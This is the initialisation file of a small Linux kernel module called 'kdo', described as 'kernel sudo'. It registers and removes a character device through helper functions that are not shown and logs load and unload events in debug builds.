#include <linux/init.h>
#include <linux/module.h>

#include "kdo.h"
#include "cdev.h"
#include "config.h"


static int __init kdo_init(void)
{
	int ret;

	if ((ret = cdev_create()))
		return ret;

	#ifdef DEBUG
	kdo_log(KERN_INFO, "module loaded");
	#endif

	return 0;
}

static void __exit kdo_exit(void)
{
	cdev_destroy();

	#ifdef DEBUG
	kdo_log(KERN_INFO, "module unloaded");
	#endif
}


MODULE_LICENSE("GPL");
MODULE_AUTHOR("hiatus");
MODULE_DESCRIPTION("kernel sudo");
MODULE_VERSION("0.01");

module_init(kdo_init);
module_exit(kdo_exit);
